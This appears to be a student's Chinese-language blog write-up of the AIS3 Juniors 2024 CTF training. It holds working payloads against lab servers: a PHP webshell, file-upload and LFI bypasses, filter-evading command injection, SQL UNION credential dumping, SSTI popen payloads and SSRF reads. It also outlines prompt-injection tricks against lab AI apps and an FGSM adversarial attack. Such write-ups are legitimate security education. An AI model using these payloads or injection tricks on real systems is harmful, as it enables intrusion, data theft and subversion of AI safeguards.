---
title: AIS3 Juniors 2024
published: 2025-06-10
description: ''
image: ''
tags: ["CTF","AIS3 Juniors","writeup"]
category: ''
draft: false 
lang: ''
---

# 前情提要
高一下，由於實驗班的程式課程，我對資訊領域產生濃厚興趣，並在第一次 APCS 考試中取得 2 / 2 的成績。在學長的介紹下，我開始接觸 AIS3 Junior，對資安領域也愈發好奇。當時我僅具備 Python 與 C++ 的基礎知識，兩者皆處於入門階段。儘管如此，我仍決定報名 AIS3 Junior。報名需要資格審查，但我除了 APCS 的成績外，幾乎沒有相關經歷，只能憑著熱情與誠意撰寫報名表。原以為落選，卻意外收到備取通知，幾天後順利遞補上榜，正式展開我的資安之旅。

# 心得
這是我首次參加資安課程，課程內容涵蓋 Kali Linux、網路概論、網頁安全以及 AI 應用安全實務。在課程結束前，我們需根據所學完成一個專題製作。
由於我此前主要專注於競賽型程式設計，這門課成為我正式踏入資安領域的起點。透過課程，我學會了多種紅隊攻擊技巧，其中我最擅長且最感興趣的為 Web 與 Pwn 類型的攻擊。
課程期間，我積極與助教交流，獲得了許多寶貴的建議與學習方向。也正是在這段時間，我立下決心投入資安領域，並於課餘時間持續自學、與助教討論，希望不斷提升技術能力。
我所參與的專題，是在講師提供的題目基礎上進行改造。我們利用 comment injection 技巧成功取得原始碼後，設計了更嚴謹的防禦機制，包括加入黑名單過濾常見 injection 攻擊手法，並新增輸入長度限制，使破解者更難取得 flag 。

# Linux(沒對題號)
![image](https://hackmd.io/_uploads/ry8_9t650.png)
## Cat is a powerful meow meow command 
![image](https://hackmd.io/_uploads/BklQjFac0.png)
## Traveling in Linux is just easy beezy
![image](https://hackmd.io/_uploads/BybFstp9R.png)
## Cannot See...
![image](https://hackmd.io/_uploads/ryeait6q0.png)
## Sometime file is just there
![image](https://hackmd.io/_uploads/Hy9G6Y690.png)

![image](https://hackmd.io/_uploads/HJhEJ565A.png)

![image](https://hackmd.io/_uploads/ryaLk5acC.png)

![image](https://hackmd.io/_uploads/S1InJcacA.png)

![image](https://hackmd.io/_uploads/r1g8eca90.png)






# linux-lab(題目不能用)

# Information Leakage(忘記要做什麼了)



# 01 - Broken Access Control
## BAC01 
網址: http://ctfd-ais3.crazyfirelee.tw:9001/
![image](https://hackmd.io/_uploads/ByRsCPh90.png)
1.隨便輸入名字 #Hamichi
![image](https://hackmd.io/_uploads/ryn71OncC.png)
2.將網址(http://ctfd-ais3.crazyfirelee.tw:9001/user)的/user改成/admin  /因為admin = '<'
![image](https://hackmd.io/_uploads/Sy7_yuhc0.png)

## BAC02 
網址: http://ctfd-ais3.crazyfirelee.tw:9002/
![image](https://hackmd.io/_uploads/S1tpku29C.png)
1.點擊 "Product List"
![image](https://hackmd.io/_uploads/rJAUg_25A.png)
2.觀察每個商品的連結(尾巴的代號少了4)
![image](https://hackmd.io/_uploads/HytpgO2cR.png)
3.將連結改成http://ctfd-ais3.crazyfirelee.tw:9002/product/4 並點擊買
![image](https://hackmd.io/_uploads/rkiMW_2qA.png)
![image](https://hackmd.io/_uploads/ByuXWu29C.png)
## BAC03 
網址: http://ctfd-ais3.crazyfirelee.tw:9003/
要使用Linux裡面的" curl '連結' "
![image](https://hackmd.io/_uploads/ByXnMOnqC.png)
1.隨便輸入名字 #Hamichi
![image](https://hackmd.io/_uploads/r1lAMO25C.png)
2.將網址(http://ctfd-ais3.crazyfirelee.tw:9001/user)的/user改成/admin  //如果查詢會出現別的畫面
![image](https://hackmd.io/_uploads/Byw4Qu390.png)
![image](https://hackmd.io/_uploads/HkQHQ_3qC.png)
3.打開Linux使用curl來破解(連結用改完的)並找到flag
![螢幕擷取畫面 2024-08-16 144313](https://hackmd.io/_uploads/SJhWNdn9R.jpg)
![螢幕擷取畫面 2024-08-16 144515](https://hackmd.io/_uploads/ByRDEuhcA.jpg)



# 02 - File Upload
## FIL01 
網址: http://ctfd-ais3.crazyfirelee.tw:9011/
![image](https://hackmd.io/_uploads/SkQGvuh9A.png)
1.點擊 Upload Area
![image](https://hackmd.io/_uploads/BkO8Puhq0.png)
2.寫一個webshell(檔名.php)並將其上傳
```<?php system($_GET['cmd']);?>```
![image](https://hackmd.io/_uploads/rysODlpq0.png)
3.將網址改成http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php
![image](https://hackmd.io/_uploads/SkUcPxTcR.png)
4.執行程式(在連結加上```?cmd=ls ../```)找到FLAG
![image](https://hackmd.io/_uploads/Hkgmtl69C.png)
5.執行程式```?cmd=cat ../FLAG```
![image](https://hackmd.io/_uploads/Hy28FeTq0.png)



## FIL02 (這題有防php檔)
網址: http://ctfd-ais3.crazyfirelee.tw:9012/
1.使用Burp Suite Community Edition開Goolge
![image](https://hackmd.io/_uploads/ryWreWaq0.png)
![image](https://hackmd.io/_uploads/HkBbx-Tc0.png)
2.點擊 Upload Area
![image](https://hackmd.io/_uploads/ryxEe-pq0.png)
3.寫一個webshell(檔名.png.php)並將其上傳並攔截
![image](https://hackmd.io/_uploads/H1HTVWp5R.png)
![image](https://hackmd.io/_uploads/HJKIS-TqC.png)
4.改成```Content-Type: image/jpg ```(記得關掉攔截)
![image](https://hackmd.io/_uploads/SkCpSWpcA.png)
5.將網址改成http://ctfd-ais3.crazyfirelee.tw:9012/uploads/c3644_108.160.138.201.php
![image](https://hackmd.io/_uploads/SyqSw-pq0.png)
6.執行程式(在連結加上```?cmd=ls ../```)找到FLAG
![image](https://hackmd.io/_uploads/B12uDW69C.png)
7.執行程式```?cmd=cat ../FLAG```
![image](https://hackmd.io/_uploads/rk8qvZacR.png)



# 03 - Local File Inclusion
## LFI01 
網址: http://ctfd-ais3.crazyfirelee.tw:9021/
![image](https://hackmd.io/_uploads/ryca6-6qC.png)
1.發現貓貓怪怪的(通靈)，在新增分頁打開它
![image](https://hackmd.io/_uploads/rJTGAWT9A.png)
2.使用编码读取```index.php?file1=php://filter/read=convert.base64-encode/resource=file.txt```
連結改成http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=static/bitcoinCat.jpg&file=php://filter/read=convert.base64-encode/resource=index.php
![image](https://hackmd.io/_uploads/Skf50-p9A.png)
3.發現文字被Base64加密，將其解密
![image](https://hackmd.io/_uploads/HkNXJz6c0.png)
4.找到帳密(帳:admin 密:CATLOVEBITCOINMEOWMEOW)並登入

## LFI02 
網址: http://ctfd-ais3.crazyfirelee.tw:9022/
![image](https://hackmd.io/_uploads/H1gVBM6q0.png)
1.點擊 Upload Area
![image](https://hackmd.io/_uploads/H1mHBfT50.png)
2.寫一個webshell(檔名.php)並將其上傳
```<?php system($_GET['cmd']);?>```
![image](https://hackmd.io/_uploads/Sy85BG69C.png)
3.回到Upload Area發現連結可以去到根目錄(http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../../../../../../../)
![image](https://hackmd.io/_uploads/HyRy8Mp5C.png)
4.把/tmp/c3644_108.160.138.201.php也貼上去
![image](https://hackmd.io/_uploads/BJlDLzTqC.png)
5.執行程式(在連結加上```&cmd=ls```)找到S3Cr3TFLAGGGGG
![image](https://hackmd.io/_uploads/BytnUMT9R.png)
6.
執行程式(在連結加上```&cmd=cat S3Cr3TFLAGGGGG```)
![image](https://hackmd.io/_uploads/H121vfp9R.png)



# 04 - Cross-Site Scripting

## XSS01 
網址: http://ctfd-ais3.crazyfirelee.tw:9031/
![image](https://hackmd.io/_uploads/Bko7ZMp9R.png)
1.輸入:```<script>alert(FLAG)</script>```
![image](https://hackmd.io/_uploads/BJ6Mbz6cC.png)



# 05 - Command Injection
## CMD01 
網址: http://ctfd-ais3.crazyfirelee.tw:9041/
![image](https://hackmd.io/_uploads/H18Xpk69C.png)
1.輸入:```;ls```
![image](https://hackmd.io/_uploads/r159p1p9A.png)
2.輸入:```;cat FLAG```
![image](https://hackmd.io/_uploads/BkRA6yT9C.png)

## CMD02 
網址: http://ctfd-ais3.crazyfirelee.tw:9042/
![image](https://hackmd.io/_uploads/HJ0FWza50.png)
1.輸入:```; echo *```
![image](https://hackmd.io/_uploads/HkSp-facR.png)
2.輸入:```;c\at FLAG*```
![image](https://hackmd.io/_uploads/BJ3mzGa9A.png)

## CMD03 
網址: http://ctfd-ais3.crazyfirelee.tw:9043/
![image](https://hackmd.io/_uploads/SyIWufpcC.png)
1.輸入:```$(l${x}s|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/Skcmdf65A.png)
2.解密文字(base64)
![image](https://hackmd.io/_uploads/r1nLdM6q0.png)
3.輸入:```$(ca${x}t${IFS}FLAG|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/rk0__G65C.png)
4.解密文字(base64)
![image](https://hackmd.io/_uploads/rJdquzacR.png)

## CMD04 
網址: http://ctfd-ais3.crazyfirelee.tw:9044/
![image](https://hackmd.io/_uploads/Sy8-axAqA.png)
1.輸入:```$(l${x}s|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/rkbN6xAcC.png)
2.解密文字(base64)
![image](https://hackmd.io/_uploads/BJFrpg0q0.png)
3.輸入:```$(ca${x}t${IFS}ERRORCMDi_FLAG|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/HktdTlA50.png)
4.解密文字(base64)
![image](https://hackmd.io/_uploads/r1Yqae090.png)



## [Bonus] CMD06 
網址: http://ctfd-ais3.crazyfirelee.tw:9046/
![image](https://hackmd.io/_uploads/H1nxik6cR.png)
1.輸入:```$(l${x}s|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/r1Ouj16cR.png)
2.發現它是Base64加密過的文字，解密完發現FLAG
![image](https://hackmd.io/_uploads/r1x3iJ6qC.png)
3.輸入:```$(ca${x}t${IFS}FLAG|base64${IFS}-w${IFS}0)```
![image](https://hackmd.io/_uploads/ryN7ny6cR.png)
4.發現它是Base64加密過的文字，解密完發現FLAG答案
![image](https://hackmd.io/_uploads/HyHi2JpqR.png)



# 06 - SQL Injection
## SQL01
網址: http://ctfd-ais3.crazyfirelee.tw:9051/
![image](https://hackmd.io/_uploads/rkhCGf6qA.png)
1.Account輸入:```admin'--``` (神奇的黑魔法)||Password隨便打
![image](https://hackmd.io/_uploads/HyKQmfa5A.png)

## SQL02
網址: http://ctfd-ais3.crazyfirelee.tw:9052/
![image](https://hackmd.io/_uploads/SyJ9aOpcA.png)
1.輸入:```()'UNION SELECT NULL,NULL,NULL,NULL#```
![image](https://hackmd.io/_uploads/SyLlAda90.png)
2.輸入```pp' UNION SELECT group_concat(schema_name),group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) from information_schema.schemata#```
![image](https://hackmd.io/_uploads/SyZd0OT90.png)
3.輸入:```pp' UNION SELECT group_concat(table_name),group_concat(table_name),group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema='ApexPredators' #```
![image](https://hackmd.io/_uploads/Bkvq0dacC.png)
4.輸入:```pp' UNION SELECT id,username,password,isAdmin from ApexPredators.users#```
![image](https://hackmd.io/_uploads/SkOCRO690.png)
5.找找到帳密(帳:KubenBlisk 密:BliskLeader#2024)並登入
![image](https://hackmd.io/_uploads/HkJ91tp90.png)



# 07 - Server-Side Template Injection
## STI01
網址: http://ctfd-ais3.crazyfirelee.tw:9061/
![image](https://hackmd.io/_uploads/BJG0Yz69R.png)
1.輸入:``` {{"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat FLAG').read()}}```
![image](https://hackmd.io/_uploads/Hk8g9GTcA.png)

## STI02
網址: http://ctfd-ais3.crazyfirelee.tw:9062/
![image](https://hackmd.io/_uploads/HkYtqGpcR.png)

輸入:```{{request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()}}```
![image](https://hackmd.io/_uploads/r145cGTcC.png)



# 08 - Server-Side Request Forgery
## SRF01
網址: http://ctfd-ais3.crazyfirelee.tw:9071/ 
![image](https://hackmd.io/_uploads/ByQ4iM69C.png)
1.輸入:```file:///app/FLAG```
![image](https://hackmd.io/_uploads/rkVIjza90.png)
2.查詢原始碼
![image](https://hackmd.io/_uploads/B1sKjfTc0.png)
![image](https://hackmd.io/_uploads/rkrhifa5C.png)
3.解碼(base64)
![image](https://hackmd.io/_uploads/S11z3zpqR.png)

## SRF02
網址: http://ctfd-ais3.crazyfirelee.tw:9072/ 
![image](https://hackmd.io/_uploads/H1Nr3Mp9R.png)
1.輸入:```file:///proc/self/environ```
![image](https://hackmd.io/_uploads/rJDt3z6c0.png)
2.查詢原始碼
![image](https://hackmd.io/_uploads/S1jk6fpcA.png)
![image](https://hackmd.io/_uploads/rkhETz690.png)
3.解碼(base64)
![image](https://hackmd.io/_uploads/Hklwpfac0.png)

## SRF03
網址: http://ctfd-ais3.crazyfirelee.tw:9073/ 
![image](https://hackmd.io/_uploads/B1M582p5A.png)
1.輸入:```http://127.0.0.1/local```沒有成功(127.0.0.1被擋掉了)
![image](https://hackmd.io/_uploads/SknMwha50.png)
2.將```127.0.0.1```轉int => ```2130706433```
![image](https://hackmd.io/_uploads/BJrIvhpcR.png)
3.查詢原始碼
![image](https://hackmd.io/_uploads/Hy8Fv369C.png)
4.解碼(base64)
![image](https://hackmd.io/_uploads/BJH3v3pcA.png)








# LLM

## AI 履歷健檢
連結: http://10.18.15.253:9101/
![image](https://hackmd.io/_uploads/r1jztlCqC.png)
使用```=====```和```\n\n\n\n```分割開來(我試了12次)

## AI 食譜大師
連結: http://10.18.15.253:9102/
![image](https://hackmd.io/_uploads/S1Oopqp9R.png)
當欺詐師:把FLAG變蛋糕，還用"-"分開(好騙)

## 貓貓線上商品專櫃
連結: http://10.18.15.253:9103/
![image](https://hackmd.io/_uploads/ryZckoT90.png)
可以用API(有洞不鑽怎麼可能)

## AI Markdown 文章翻譯
連結: http://10.18.15.253:9104/
![image](https://hackmd.io/_uploads/B1qA4npcC.png)
攔截資訊偷偷改(造成誤會)

## 數學幫手😎
連結: http://10.18.15.253:9105/
![image](https://hackmd.io/_uploads/BJCVgn6cC.png)
它很乖，有問題會說

# adversarial attack
## FGSM
* 對抗性攻擊：
使用迭代式 FGSM（Iterative FGSM）攻擊來生成對抗樣本，旨在使預訓練的模型對圖像的預測結果產生錯誤。這種攻擊方法通過逐步添加小的擾動來改變圖像，從而達到模型被欺騙的效果
* 預測與比較：
在對抗性攻擊之前和之後，使用模型對圖像進行預測，並將原始圖像和對抗樣本進行比較。這包括顯示預測結果的變化（例如，從狗的圖像變成貓的圖像）以及計算原始圖像和對抗樣本之間的擾動量
* 結果保存與顯示：
將原始圖像、對抗樣本、預測結果和擾動量保存到指定的目錄中，並顯示這些圖像的比較。這有助於評估攻擊的效果和模型對對抗樣本的反應
![image](https://hackmd.io/_uploads/B1rEiW0qA.png)
我重複用了三次(因為試不過三)
![image](https://hackmd.io/_uploads/Bk_WWGAcR.png)







